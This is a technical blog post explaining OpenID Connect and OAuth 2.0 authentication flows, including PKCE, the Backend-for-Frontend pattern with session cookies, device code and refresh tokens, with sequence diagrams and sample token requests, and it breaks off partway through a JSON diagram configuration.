---
authors:
- copdips
categories:
- auth
- frontend
- web
- api
comments: true
date:
    created: 2025-11-18
    updated: 2025-11-24
---

# OIDC (OpenID Connect)

[OIDC (OpenID Connect)](https://openid.net/connect/) is an **authentication layer** (verify identity + obtain profile) built on top of the OAuth2 protocol (**authorization layer**). It allows Web-based, mobile, and JavaScript clients to verify the identity of end-users based on the authentication performed by an authorization server (aka AS or IdP), as well as to obtain basic profile information about the end-user in an interoperable and REST-like manner. It eliminates storing and managing people's passwords.

<!-- more -->

## References

1. **OAuth2**: https://learn.microsoft.com/en-us/entra/identity-platform/v2-app-types
2. **SPA**: https://curity.io/resources/learn/spa-best-practices/
3. **SPA/SSO**: https://fusionauth.io/articles/login-authentication-workflows/spa/oauth-authorization-code-grant-sessions-refresh-tokens-cookies
4. **SSO**: https://fusionauth.io/articles/authentication/how-sso-works
5. **BFF**: https://fusionauth.io/blog/backend-for-frontend
6. **Cookies**: https://auth0.com/blog/application-session-management-best-practices/
7. **Cookies**: https://curity.io/resources/learn/oauth-cookie-best-practices/
8. **RFC9700 - Best Current Practice for OAuth 2.0 Security**: https://datatracker.ietf.org/doc/rfc9700/
9. **OAuth 2.0 Security (inspired from RFC-9700)**: https://workos.com/blog/oauth-common-attacks-and-how-to-prevent-them
10. **OAuth 2.0 for Browser-Based Applications (2026) (derived from RFC9700)**: https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps
11. **OAuth 2.0 Security: Demonstrating Proof of Possession (DPoP) + Step-Up Authentication Challenge Protocol**: https://auth0.com/blog/oauth2-security-enhancements

## OIDC Flows

| Flow                                                  | Purpose                                   | response_type                              | Notes                                                                                                                                                     |
| ----------------------------------------------------- | ----------------------------------------- | ------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 🚫Deprecated Resource Owner Password Credentials grant | SPA, native apps, desktop, mobile         | - (direct `/token`, no `/authorize`)       | ⚠️User password is given to unsecure client App, but not Identity Provider                                                                                   |
| 🚫Deprecated Implicit Flow                             | SPA, native apps, desktop, mobile         | `token` or `id_token` or `code id_token`, etc.                | `⚠️access_token` exposed in browser URL                                                                                                                       |
| 🚫Deprecated Authorization Code Flow without PKCE      | SPA, native apps, desktop, mobile         | `code`                                     | ⚠️Without `code_verifier` from PKCE, Identity Provider cannot verify the auth code sent to `/token` is from the original client                               |
| Authorization Code Flow + PKCE (Public Client)        | Interactive SPA, native apps, desktop, mobile         | `code`                                     | No `client_secret`, uses PKCE                                                                                                                             |
| Authorization Code Flow + BFF (Confidential Client)<br/>mixed with Client Credentials Flow         | Interactive web backends / BFF                        | `code`                                     | Uses `client_secret`                                                                                                                                       |
| Client Credentials Flow                               | Non-interactive Machine-to-machine                        | - (direct `/token`, no `/authorize`)       | No user involved                                                                                                                                          |
| Device Authorization Flow (Device Code)               | Half-interactive TVs, CLI apps, IoT                        | - (POST `/device`, user enters `user_code`) | User logs in on separate device.<br/>Useful when no browser available or with limited input capabilities.<br/>e.g. <https://microsoft.com/devicelogin>    |

### Deprecated Resource Owner Password Credentials Grant (ROPC)

- ❌User give password to client instead od Authorization Server (IdP), which is insecure and breaks the OAuth2 model.
- ❌Does not support modern authentication methods like MFA, SSO, etc, as user don't interact with IdP directly.

```mermaid
sequenceDiagram
    autonumber
    actor User as User
    participant Client as Client App
    participant IdP as Identity Provider (AS)

    rect rgb(255,200,200)
    User ->> Client: ❌Enter password in Client App UI instead of Identity Provider (AS) UI❌
    end

    Client ->> IdP: POST /token {<br/>grant_type=password,<br/>username=alice,<br/>password=secret,<br/>client_id=...,<br/>client_secret=...}

    IdP ->> IdP: Validate username & password

    IdP ->> Client: access_token + id_token + refresh_token (optional)
```

### Deprecated Implicit Flow

1. Initiated by : `GET /authorize?response_type=token&...`, some vendors use `response_type=id_token token&...`.
2. ❌IdP returns tokens directly in URL fragment (`&access_token=...&...`), which is exposed to browser history, referrers, and potentially malicious scripts.

```mermaid
sequenceDiagram
    autonumber
    actor User as User
    participant SPA as SPA (Browser App)
    participant Browser as Browser (Front-channel)
    participant IdP as Identity Provider (AS)

    User ->> SPA: Click "Login"

    rect rgb(255,200,200)
    SPA ->> Browser: Redirect to<br/>/authorize?response_type=token&...
    end

    Browser ->> IdP: GET /authorize?response_type=token&...

    User ->> IdP: Enter Password or MFA

    IdP ->> Browser: 302 redirect to<br/>https://app/callback#35;code&access_token=AT123&id_token=IDT456&...

    rect rgb(255,200,200)
    Note over Browser: ❌Tokens in URL fragment❌<br/>Accessible to browser history, referrers, XSS scripts
    end

    Browser ->> SPA: SPA receives access_token AT123 and id_token IDT456

    SPA ->> User: Display "Logged in as Alice"
```

### Deprecated Authorization Code Flow without PKCE (Public Client) for SPA

Same as below [Authorization Code Flow + PKCE (Public Client) for SPA](#authorization-code-flow--pkce-public-client-for-spa), but **without** `code_verifier` provided by PKCE (Proof Key for Code Exchange).

Because the Authorization Code Flow hands the code through the unsecure browser's front channel, an untrusted path, an attacker who intercepts that code can replay it at `/token` and steal tokens ([Authorization Code Injection](https://www.thehacker.recipes/web/config/identity-and-access-management/oauth-2.0#authorization-code-injection)). PKCE prevents this: the SPA generates a `code_verifier`, keeps it secret, and later submits it over the secure back channel, enabling the Identity Provider to confirm that the caller exchanging the code (by `POST /token`) is the same client that initiated `GET /authorize`.

### Authorization Code Flow + PKCE (Public Client) for SPA

This flow works for a **single audience** (the Downstream API).

With **PKCE** (Proof Key for Code Exchange), **Authorization Code Injection attacks** are mitigated: even if an attacker steals a valid authorization code, only the original instance that generated the `code_verifier` (the SPA or BFF) can redeem it for tokens, keeping the overall design significantly more robust. And the SPA can securely perform the Authorization Code Flow without a client secret, which is not suitable for public clients like SPAs.

!!! warning "SPA Auth Code flow + PKCE is secure ONLY IF the JS scripts installed by SPA (via NPM for .e.g.), your browser and underlying OS/transport layers are secure"
    Although with PKCE, the SPA (considered as public client) doesn't need to hold the **client secret**, the main risk factor in SPA+PKCE is XSS attacks, as **access tokens are stored in browser memory/sessionStorage**, which are accessible to JavaScript code running in the browser, including potentially malicious scripts injected via XSS vulnerabilities or browser extensions. Therefore, it's crucial to implement robust security measures to protect against XSS attacks when using this flow.

    The IETF now (as of 2025) recommends the [Backend-For-Frontend (BFF) pattern](#oidc-authorization-code-flow-confidential-client-with-bff-pattern-and-session-cookies) as the gold standard for securing modern web applications, moving all authentication logic from public browser to a confidential server.

**OIDC Authorization Code Flow with PKCE for SPA:**

Initiated by : `GET /authorize?response_type=code&...`

```mermaid
sequenceDiagram
    autonumber
    actor User as User
    participant SPA as SPA (Browser App)
    participant Browser as Browser (Front-channel)
    participant IdP as Identity Provider (AS)
    participant Store as IdP Internal Store
    participant DownstreamAPI as Downstream API (Resource Server)

    %% ============================================================
    %% STEP 0 - SPA PREPARES PKCE + STATE + NONCE
    %% ============================================================
    Note over SPA: SPA creates:<br/>state = S999  <<ONE-TIME>><br/>nonce = N123  <<ONE-TIME>><br/>code_verifier = random <<ONE-TIME>><br/>code_challenge = BASE64URL( SHA256(code_verifier) )<br/><br/>state for CSRF protection for OIDC and OAuth2, returned by IdP in url query param<br/>nonce for ID token replay protection only for OIDC. returned by IdP in ID token claim

    %% ============================================================
    %% STEP 1 - SPA INITIATES AUTHORIZATION REQUEST
    %% ============================================================
    User ->> SPA: Click "Login"

    rect rgb(255,200,200)
    SPA ->> Browser: Redirect to /authorize?<br/>client_id=my_spa<br/>redirect_uri=https://app/callback<br/>response_type=code<br/>scope=openid profile read:data<br/>audience=https://my-downstream-api<br/>state=S999<br/>nonce=N123<br/>code_challenge=<computed><br/>code_challenge_method=S256
    end

    rect rgb(255,200,200)
    Note over Browser: FRONT CHANNEL EXPOSED<br/>User agent sees:<br/>state + nonce + code_challenge + audience + scopes
    end

    Browser ->> IdP: GET /authorize?(client_id, state=S999, nonce=N123,...)

    %% ============================================================
    %% STEP 2 - IdP CREATES AUTHORIZATION SESSION
    %% ============================================================
    Note over IdP: Persist request metadata
    IdP ->> Store: Save authorization_session:<br/>authorization_session_id = A555<br/>client_id = my_spa<br/>redirect_uri=https://app/callback<br/>state=S999<br/>nonce=N123<br/>requested_scopes=["openid","read:data"]<br/>requested_audience="https://my-downstream-api"<br/>code_challenge=<stored><br/>login_session_id=null

    %% ============================================================
    %% STEP 3 - USER AUTHENTICATES
    %% ============================================================
    User ->> IdP: Enter Password or MFA

    IdP ->> Store: Create login_session:<br/>login_session_id=L123<br/>user_id="alice"
    IdP ->> Store: Link authorization_session A555 -> L123

    %% ============================================================
    %% STEP 4 - USER APPROVES & IdP RETURNS AUTHORIZATION CODE
    %% ============================================================
    IdP ->> Store: Create authorization_code:<br/>authorization_code=C789<br/>authorization_session_id=A555<br/>user="alice"<br/>expires_in=60s

    rect rgb(255,200,200)
    IdP ->> Browser: 302 redirect to https://app/callback?<br/>authorization_code=C789<br/>state=S999
    end

    Browser ->> SPA: SPA receives authorization_code C789 and state=S999

    %% ============================================================
    %% STEP 5 - SPA EXCHANGES CODE FOR TOKENS (PKCE)
    %% ============================================================
    rect rgb(200,255,200)
    Note over SPA: PKCE step - with code_verifier<br/>Proves that the party calling /token is the same client that initiated the /authorize request<br/>Private HTTPS channel, NOT exposed in browser URL
    end

    SPA ->> IdP: POST /token<br/>grant_type=authorization_code<br/>client_id=my_spa<br/>redirect_uri=https://app/callback<br/>authorization_code=C789<br/>code_verifier=<original random>

    %% ============================================================
    %% STEP 6 - IdP VALIDATES auth_code + PKCE (NO nonce validation)
    %% ============================================================
    IdP ->> Store: Lookup C789 -> A555 -> L123 -> user="alice"
    IdP ->> IdP: ✅Validate PKCE:<br/>BASE64URL(SHA256(code_verifier)) == stored code_challenge ?
    Note over IdP: IdP embeds stored nonce N123<br/>into the ID Token claims

    %% ============================================================
    %% STEP 7 - IdP ISSUES TOKENS (INCLUDING NONCE)
    %% ============================================================
    Note over IdP,SPA: ❗Sending high-valued refresh tokens without rotation to unsecure SPAs is strongly discouraged.
    IdP ->> SPA: access_token(aud=https://my-downstream-api)<br/>id_token(sub="alice", nonce=N123)<br/>refresh_token(optional with rotation or often disabled for SPAs)

    %% SPA verifies nonce
    SPA ->> SPA: Validate id_token.nonce == N123 ?

    rect rgb(255,200,200)
    Note over SPA: ⚠️Tokens stored in JS memory/sessionStorage⚠️<br/>Accessible to XSS / browser extensions<br/>Main risk factor in SPA+PKCE
    end

    SPA ->> User: Display "Logged in as Alice"

    %% ============================================================
    %% OPTIONAL STEP - CALL /userinfo FOR EXTRA CLAIMS
    %% ============================================================
    SPA ->> IdP: GET /userinfo<br/>Authorization: Bearer <access_token><br/><br/>/userinfo may contain more claims than id_token, and also used for getting updated user info
    IdP ->> SPA: {sub:"alice", email:"alice@example.com", name:"Alice"}

    %% ============================================================
    %% POST-LOGIN OPERATIONAL SEQUENCE (SPA CALLS API)
    %% ============================================================

    rect rgba(153, 179, 219, 1)
    Note over SPA,DownstreamAPI: Post-login: SPA uses ONLY access_token to call downstream API
    end

    SPA ->> DownstreamAPI: GET /resource<br/>Authorization: Bearer <access_token(aud=https://my-downstream-api)><br/><br/>id_token is not used for calling downstream APIs (resource servers)

    DownstreamAPI ->> DownstreamAPI: Validate token:<br/>- Verify signature via JWKS<br/>- iss == "https://idp"<br/>- aud == "https://my-downstream-api"<br/>- exp not expired<br/>- scope includes read:data

    DownstreamAPI ->> DownstreamAPI: Extract identity from access_token JWT:<br/>sub="alice"<br/>email claim<br/>roles claim<br/><br/>GET /userinfo could be used here but hurts performance (one more API call), and adds coupling to IdP.

    DownstreamAPI ->> SPA: Return protected JSON for Alice
```

### OIDC Authorization Code Flow (Confidential Client) with BFF pattern and Session Cookies

In **BFF (Backend For Frontend)** pattern , **OIDC** is used for initial authentication and obtaining user identity, then **session cookies** are used to maintain the authenticated state within the application.

BFF often employs this combination. BFF is one of the strongest patterns for browser-based apps. BFF handles the complex OIDC token flows and securely translates them into a simple, traditional session cookie for the browser. This approach offers several advantages:

- **performance**: avoid sending large 2-4KB JWT on every request, but with ~100 byte cookie.
- **simplicity**: frontend just needs to include a cookie with its requests, just like in the old days, and doesn't need to manage token refreshing or storage.

!!! note "BFF is considered as a more secure approach compared to SPA+PKCE"
    As tokens are never exposed to the browser environment, reducing the risk of token theft via XSS attacks. But BFF itself must implement all the measures to prevent Cross-Site Request Forgery (CSRF) attacks (e.g. by requiring a custom header from client). And in practice, the SPA and the BFF backend should share the same site (parent domain) (e.g. `spa.example.com` and `bff.example.com` with a cookie `Domain=example.com`), so that the BFF session cookie is treated as first-party in the browser.

    **Challenge for SPA with cookie**: Even though the cookie is set with `SameSite=Lax` or `SameSite=None`, modern browsers (as of 2025, already done by Safari ITP, Firefox ETP, Chrome is phasing out) block third-party cookies by default. Which means: "When an SPA (on `app.com`) tries to use a hidden iframe to call the IdP (on `auth0.com`), the browser sees `auth0.com` as a third party, browser will simply strip the cookies from that iframe request, even if cookies are set with [SameSite=None](#securing-cookies-in-modern-authentication)".

    **Result**: [hidden iframe often cannot see the IdP session cookie anymore](https://auth0.com/docs/secure/tokens/refresh-tokens/refresh-token-rotation). So [iframe based silent auth](https://auth0.com/docs/authenticate/login/configure-silent-authentication) (`GET /authorize?prompt=none`) breaks in many browsers, and users get randomly kicked out or asked to log in again.

    **Solutions:**

    1. **First-party context authentication with popup or redirect (used by SSO):**
       [Use popup windows or full-page redirects](https://learn.microsoft.com/en-us/entra/identity-platform/reference-third-party-cookies-spas#performance-and-ux-implications) to the IdP instead of hidden iframes. In these flows, the IdP runs in a top-level browsing context (same tab or popup), so its cookies are treated as first-party and are sent normally. This still allows **SSO via the IdP session cookie**, but the navigation is no longer completely invisible to the user.

    2. **Refresh token rotation for SPA session persistence:**
       Instead of relying on the IdP session cookie for iframe-based silent auth, perform one interactive login (Authorization Code + PKCE) and issue the SPA a **rotating refresh token** with strict idle and absolute lifetimes. The SPA calls `/token` directly to obtain new access tokens, and the refresh token is rotated on every use with reuse detection. This maintains the SPA's session without depending on third-party cookies. See [Refresh token flow](#refresh-token-flow) for details.

    3. **BFF on the same site (SPA <-> BFF only):**
       Host the BFF and SPA under the same parent domain (for example, `app.example.com` and `api.example.com` with a cookie `Domain=.example.com`) so that the browser always treats the BFF session cookie as first-party for requests from the SPA. This solves SPA↔BFF cookie issues, but not IdP SSO issues, because external IdPs (Microsoft Identity Platform, Auth0, Okta, etc.) typically live on a different domain.

Once the user is authenticated, the BFF can use multiple methods to obtain access tokens for different downstream APIs:

| Method                             | Used For                                          | User Context Provided Directly?              | Multi-API   | Refresh Token Needed |
| ---------------------------------- | ------------------------------------------------- | -------------------------------------------- | ----------- | -------------------- |
| **Refresh Token**                  | Standard BFF                                      | ✔ Yes (from IdP, with BFF's access token)    | ✔ Excellent | ✔ Yes                |
| **[Token Exchange (RFC 8693)](https://www.rfc-editor.org/rfc/rfc8693.html)**      | Best modern multi-API                             | ✔ Yes (delegated, act on behalf of the user) | ✔✔✔ Best    | ❌ No                 |
| **Client Credentials**             | Machine-to-Machine                                | ❌ No                                         | ✔ OK        | ❌ No                 |
| **JWT Bearer Assertion**           | Server identity                                   | Optional (if user included)                  | ✔ Yes       | ❌ No                 |
| **mTLS (with X.509 certificates)** | High security internal systems                    | ❌ No                                         | ✔ Yes       | ❌ No                 |
| **API Keys**                       | Same as mTLS but with API key<br/>Legacy / simple | ❌ No                                         | ✔ OK        | ❌ No                 |
| **Internal Headers / Cookies**     | Service mesh                                      | Optional (propagated)                        | ✔ Yes       | ❌ No                 |

**OIDC Authorization Code Flow with stateful BFF pattern and refresh token grant for multiple Downstream APIs (API-1 and API-2):**

!!! note "the BFF flow could have many variations, below diagram is one of them"
    See below [BFF Pattern with HttpOnly Cookies: The Modern Best Practice](#bff-pattern-with-httponly-cookies-the-modern-best-practice) for details.

```mermaid
sequenceDiagram
    autonumber

    actor User as User
    participant WebApp as Web Client (SPA/Swagger)
    participant Browser as Browser

    participant BFF as API Backend (Stateful BFF)<br/>(Confidential Client)
    participant BFFStore as BFF Session Store<br/>(Redis/Cache)

    participant IdP as Identity Provider<br/>(OIDC Server)
    participant API1 as Downstream API-1<br/>(Resource Server)
    participant API2 as Downstream API-2<br/>(Resource Server)

    %% ============================================================
    %% STEP 0 - LOGIN INITIATION
    %% ============================================================
    Note over User,IdP: First login
    User ->> WebApp: Click "Login"
    WebApp ->> BFF: GET /login

    %% ============================================================
    %% STEP 1 - BFF GENERATES STATE & PKCE
    %% ============================================================
    Note over BFF: Generate state, nonce, code_verifier<br/>1.**state** (one-time use) for CSRF protection for OIDC/OAuth2, computed by BFF, and returned by IdP in url query param<br/>2. **nonce** (one-time use) for ID token replay protection only for OIDC. computed by BFF, and returned by IdP in ID token claim<br/>3. **code_verifier** (one-time use) for PKCE for code injection prevention. code_challenge=BASE64URL(SHA256(code_verifier))

    BFF ->> BFFStore: Save pre_session {state, nonce, verifier}

    %% FRONT-CHANNEL REDIRECT: Request ALL potential scopes
    BFF ->> Browser: 302 Location: https://idp/authorize?<br/>client_id=my_bff&response_type=code<br/>&scope=openid profile offline_access https://api-1/write https://api-2/read<br/>&state=S555&nonce=N777<br/>&code_challenge=PKCE_HASH&code_challenge_method=S256

    Note right of Browser: [Vendor Specific] Requesting all possible downstream API scopes upfront.<br/>Refresh Token enables Access Token minting for all authorized resources.

    rect rgb(255,245,255)
    Note over Browser: ⚠️FRONT CHANNEL: Query parameters visible to user agent<br/>code_challenge is sent, but it's the one-way sha256 hash of code_verifier.<br/>✅code_verifier is not sent in insecure /authorize browser request.<br/>code_verifier will be sent by BFF in secure /token in back-channel out of browser.
    end

    Browser ->> IdP: GET /authorize (client_id, state, nonce, scope, code_challenge...)

    %% ============================================================
    %% STEP 2 & 3 - AUTHENTICATION & CODE RETURN
    %% ============================================================
    User ->> IdP: Enter Credentials (Consent)

    IdP ->> Browser: 🍪Set-Cookie: idp_session=IDPSESS_ABC
    Note over IdP: 💡 **Session Note:** Flow relies on the BFF Session<br/>the IdP Session Cookie is ignored.

    IdP ->> Browser: 302 https://api/callback?code=C444&state=S555
    Browser ->> BFF: GET /callback?code=C444&state=S555

    %% ============================================================
    %% STEP 4 & 5 - CODE EXCHANGE (BACK-CHANNEL with Full Payload)
    %% ============================================================
    BFFStore ->> BFF: Load State, Nonce, PKCE code_verifier
    BFF ->> BFF: Validate State

    BFF ->> IdP: 🛑 **Confidential Client Authentication** required<br/>POST /token (Code Exchange)<br/>{grant_type=authorization_code,<br/>code=C444,<br/>client_id=my_bff,<br/>client_secret=SECRET,<br/>code_verifier=VERIFIER}
    Note over BFF,IdP: client_secret and code_verifier are securely sent to IdP out of browser
    IdP ->> IdP: Validate PKCE: BASE64URL(SHA256(code_verifier)) == stored code_challenge ?
    IdP ->> BFF: {<br/>"token_type": "Bearer",<br/>"access_token": "AT_INIT",<br/>"refresh_token": "RT777",<br/>"id_token": "JWT..."<br/>}

    %% ============================================================
    %% STEP 6 - VALIDATION & SESSION CREATION
    %% ============================================================
    BFF ->> BFF: Verify ID Token signature, claims, and ASSERT nonce == N777 ?

    Note over BFF: Create Server-Side Session S333<br/>Store { user_id, refresh_token: RT777 }
    BFF ->> BFFStore: 🔒 **Stateful BFF (most secure)**<br/>Save Session S333 with access_token and refresh_token

    Note over BFF: 💡If use Stateless BFF (less secure), access_token and refresh_token both will be sent to browser<br/>💡If use hybrid BFF (best trade-off), only access_token is sent to browser, refresh_token is kept in the BFF Redis

    BFF ->> Browser: 🍪Set-Cookie: session_id=S333<br/>Domain=api.com HttpOnly Secure SameSite=Lax
    Note over Browser: 🔒 **Stateful BFF (most secure)**<br/>Browser **NEVER** sees tokens, but just a session id

    Browser ->> WebApp: Redirect to Dashboard

    %% ============================================================
    %% OPERATIONAL PHASE - CALLING API-1 (Refresh Grant with Full Payload)
    %% ============================================================
    Note over User,API1: Post-login: Call API-1
    Browser ->> BFF: GET /api1/data (Cookie S333)
    BFF ->> BFFStore: Load Session S333

    alt Access Token for API-1 Missing or Expired
        Note over BFF: FALLBACK FLOW (If Refresh Token Invalid)<br/><br/>1. BFF checks: Do I have a valid refresh_token?<br/>   -> Yes: Use refresh_token to get new access_token (silent Confidential Client Authentication)<br/>   -> No: Redirect (or popup) to IdP /authorize<br/><br/>2. Browser redirects to /authorize<br/>   Automatically sends idp_session cookie (from previous login)<br/><br/>3. IdP validates session cookie<br/>   -> Valid: Return auth code immediately (SSO, no login UI)<br/>   -> Invalid: Show interactive login page<br/><br/>4. BFF exchanges auth code for tokens<br/>   Uses client_secret (confidential client)<br/><br/>🚀In this flow, BFF has a valid refresh_token, allowing it to silently obtain new access tokens without user interaction,<br/>which achieves the effect of SSO (not a real SSO) without needing the browser to bounce back to the IdP.

        BFF ->> IdP: POST /token (Refresh Grant)<br/>{grant_type=refresh_token,<br/>refresh_token=RT777,<br/>client_id=my_bff,<br/>client_secret=SECRET,<br/>resource=https://api-1}

        IdP ->> BFF: { "access_token": "AT_API1", "refresh_token": "RT888" (optional rotation) }
        Note over Idp,BFF: 🛡️Recommended: issuing a new refresh token every time upon use (rotation)
        BFF ->> BFFStore: Update Session (Save AT_API1, Store RT888 if rotated)
    end

    BFF ->> API1: GET /resource<br/>Authorization: Bearer AT_API1
    API1 -->> BFF: Data
    BFF -->> Browser: Data

    %% ============================================================
    %% OPERATIONAL PHASE - CALLING API-2 (Reusing RT for New Resource)
    %% ============================================================
    Note over User,API2: Post-login: Call API-2

    Browser ->> BFF: GET /api2/data (Cookie S333)
    BFF ->> BFFStore: Load Session S333

    alt Access Token for API-2 Missing or Expired
        Note over BFF: Reuse RT to get token for new resource (API-2)

        BFF ->> IdP: POST /token (Refresh Grant)<br/>{grant_type=refresh_token,<br/>refresh_token=RT888,<br/>client_id=my_bff,<br/>client_secret=SECRET,<br/>resource=https://api-2}

        IdP ->> BFF: { "access_token": "AT_API2", "refresh_token": "RT999" (optional rotation) }
        Note over Idp,BFF: 🛡️Recommended: issuing a new refresh token every time the old one is used (rotation)
        Note over BFF: Store AT_API2 in Session
    end

    BFF ->> API2: GET /resource<br/>Authorization: Bearer AT_API2
    API2 -->> BFF: Data
    BFF -->> Browser: Data
```

### Device Code flow

The Device Authorization Flow (Device Code Flow) is designed for devices with limited input capabilities (e.g., smart TVs, IoT devices) where users cannot easily enter credentials, or for devices without interactive browser capabilities (e.g. CLI). Instead, the device displays a code that the user enters on a separate device (like a smartphone or computer) to authenticate.

```mermaid
sequenceDiagram
    autonumber
    participant User
    participant DeviceApp as Device / TV App
    participant AuthServer as Authorization Server
    participant Browser as User Browser
    participant API as Resource Server (API)

    User->>DeviceApp: Open app (no browser / keyboard)
    DeviceApp->>AuthServer: POST /device_authorization (client_id)
    AuthServer-->>DeviceApp: ✅device_code, user_code, verification_uri, interval, expires_in

    DeviceApp->>User: Show user_code + verification_uri (e.g. https://auth.example.com/device)

    User->>Browser: Open verification_uri
    Browser->>AuthServer: GET /device (verification_uri)
    AuthServer-->>Browser: Login & consent page
    User->>Browser: Enter username/password (Authenticate)
    Browser->>AuthServer: Submit credentials
    AuthServer-->>Browser: Verification page
    User->>Browser: Enter user_code and approve app
    Browser->>AuthServer: ✅Submit user_code
    AuthServer-->>Browser: Success page (You are done)

    loop Poll until authorized or expired
        DeviceApp->>AuthServer: POST /token (grant_type=device_code, device_code, client_id)
        AuthServer-->>DeviceApp: authorization_pending or slow_down
    end

    AuthServer-->>DeviceApp: ✅access_token (+ optional refresh_token)
    DeviceApp->>API: Call protected APIs (Authorization: Bearer access_token)
    API-->>DeviceApp: Protected resource response
```

### Refresh token flow

!!! warning "This is not a new OAuth flow, just a specific token refresh step in other flows"

Microsoft Identity Platform's way to refresh `access_token` (often `refresh_token` itself also rotates) by `refresh_token`: https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-auth-code-flow#refresh-the-access-token

- Refresh tokens are valid for all permissions that your client has already received consent.
- For public client (e.g. SPA), the default refresh_token lifetime for Microsoft Identity Platform is 24 hours.
- For confidential client (e.g. WebApps), the lifetime is relatively long (maybe 90 days)

    ```javascript title="Microsoft refresh token flow to IdP's /token request" hl_lines="3 9-10"
    // Line breaks for legibility only

    POST /{tenant}/oauth2/v2.0/token HTTP/1.1
    Host: https://login.microsoftonline.com
    Content-Type: application/x-www-form-urlencoded

    client_id=00001111-aaaa-2222-bbbb-3333cccc4444
    &scope=https%3A%2F%2Fgraph.microsoft.com%2Fmail.read
    &refresh_token=OAAABAAAAiL9Kn2Z27UubvWFPbm0gLWQJVzCTE9UkP3pSx1aXxUjq...
    &grant_type=refresh_token
    &client_secret=sampleCredentia1s    // NOTE: Only required for web apps. This secret needs to be URL-Encoded
    ```

    ```json title="Microsoft refresh token flow to IdP's /token response"
    {
        "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik5HVEZ2ZEstZnl0aEV1Q...",
        "token_type": "Bearer",
        "expires_in": 3599,
        "scope": "https%3A%2F%2Fgraph.microsoft.com%2Fmail.read",
        "refresh_token": "AwABAAAAvPM1KaPlrEqdFSBzjqfTGAMxZGUTdM0t4B4...",
        "id_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIyZDRkMTFhMi1mODE0LTQ2YTctOD..."
    }
    ```

## OAuth 2.0 User Authentication Security Evolution

!!! note "Very high-level overview of OAuth 2.0 User authentication security evolution"
    This diagram summarizes the key improvements in OAuth 2.0 security over time. Each step highlights the main actors, interactions, and security enhancements that address vulnerabilities in previous approaches.

    **Not all the actors/steps are shown for simplicity**. For example, the browser is not shown in PKCE and DPoP steps, but it's implied that the client app (SPA or BFF) runs in a browser context. Only the security improvements related actors/steps are highlighted.

    **Not all the OAuth 2.0 flows are shown**. For example, Client Credentials flow for machine-to-machine communication is not included, as it's outside the scope of user authentication evolution.

<div class="oauth-evolution" id="oauth-evolution-1">
  <script type="application/json">
  {
    "steps": [
      {
        "label": "ROPC (Deprecated)",
        "title": "Password Grant (ROPC)",
        "actors": ["User", "Client App", "Auth Server"],
        "interactions": [
          { "from": "User", "to": "Client App", "message": "username + password", "highlight": true, "warning": "Client app sees the password! Compromised app = stolen passwords." },
          { "from": "Client App", "to": "Auth Server", "message": "POST /token (password)" },
          { "from": "Auth Server", "to": "Client App", "message": "access_token" }
        ],
        "keyImprovement": "Simple direct authentication - but at the cost of exposing passwords to the client application."
      },
      {
        "label": "Implicit (Deprecated)",
        "title": "Implicit Flow",
        "comparedTo": "Password Grant",
        "actors": ["Browser", "SPA", "Auth Server"],
        "interactions": [
          { "from": "Browser", "to": "Auth Server", "message": "redirect /authorize?response_type=token" },
          { "from": "Browser", "to": "Auth Server", "message": "user login", "improvement": true, "fixes": "Auth Server handles password - client never sees it! Users authenticate directly with Auth Server, not the SPA." },
          { "from": "Auth Server", "to": "Browser", "message": "redirect with #access_token in URL", "highlight": true, "warning": "Tokens in URL fragment! Exposed to browser history, referrers, and XSS scripts. Anyone with access to browser history can steal tokens." },
          { "from": "Browser", "to": "SPA", "message": "extract token from URL" }
        ],
        "keyImprovement": "Auth Server handles password instead of the client app. But tokens are exposed in URL fragments, making them vulnerable to browser history and XSS attacks."
      },
      {
        "label": "Auth Code (Deprecated)",
        "title": "Authorization Code Flow",
        "comparedTo": "Implicit Flow",
        "actors": ["Browser", "Client App", "Auth Server"],
        "interactions": [
          { "from": "Browser", "to": "Auth Server", "message": "redirect to /authorize" },
          { "from": "Browser", "to": "Auth Server", "message": "user login" },
          { "from": "Auth Server", "to": "Client App", "message": "authorization code", "improvement": true, "fixes": "Code instead of token in URL! Auth Server returns a short-lived authorization code instead of tokens in URL fragment. The code is then exchanged for tokens via secure POST, so tokens never appear in browser history or referrers." },
          { "from": "Client App", "to": "Auth Server", "message": "exchange code for token", "warning": "Code can be intercepted and stolen without PKCE" },
          { "from": "Auth Server", "to": "Client App", "message": "access_token" }
        ],
        "keyImprovement": "Returns an authorization code instead of tokens in URL fragment. Tokens are obtained via secure back-channel POST to /token endpoint, preventing exposure in browser history and referrers."
      },
      {
        "label": "PKCE",
        "title": "Authorization Code + PKCE",
        "comparedTo": "Authorization Code",
        "actors": ["Client App", "Auth Server"],
        "interactions": [
          { "from": "Client App", "to": "Client App", "message": "generate code_verifier" },
          { "from": "Client App", "to": "Auth Server", "message": "code_challenge (hash)" },
          { "from": "Auth Server", "to": "Client App", "message": "authorization code" },
          { "from": "Client App", "to": "Auth Server", "message": "code + code_verifier", "improvement": true, "fixes": "Code verifier proves original client - no code theft! PKCE adds code_verifier proof - only the original client that started the flow can exchange the authorization code. This prevents code interception attacks." },
          { "from": "Auth Server", "to": "Client App", "message": "access_token (verified)", "warning": "Token stored in browser JavaScript - vulnerable to XSS" }
        ],
        "keyImprovement": "PKCE adds code_verifier proof - only the original client that started the flow can exchange the authorization code. This prevents code interception attacks."
      },
      {
        "label": "BFF",
        "title": "BFF Pattern (Backend for Frontend)",
        "comparedTo": "PKCE in Browser",
        "actors": ["Browser", "BFF Server", "Auth Server", "Resource Server"],
        "interactions": [
          { "from": "Browser", "to": "BFF Server", "message": "user request" },
          { "from": "BFF Server", "to": "Auth Server", "message": "OAuth flow (PKCE)" },
          { "from": "Auth Server", "to": "BFF Server", "message": "tokens (server-side only)" },
          { "from": "BFF Server", "to": "Browser", "message": "HttpOnly session cookie", "improvement": true, "fixes": "Tokens stay in BFF - browser can't access them. XSS defeated! Tokens never reach the browser - they stay securely in the BFF backend. The browser only gets an HttpOnly session cookie, which JavaScript cannot access. This eliminates XSS token theft." },
          { "from": "BFF Server", "to": "Resource Server", "message": "Bearer token", "highlight": true, "warning": "If token is stolen from BFF, attacker can replay it" }
        ],
        "keyImprovement": "Tokens never reach the browser - they stay securely in the BFF backend. The browser only gets an HttpOnly session cookie, which JavaScript cannot access. This eliminates XSS token theft."
      },
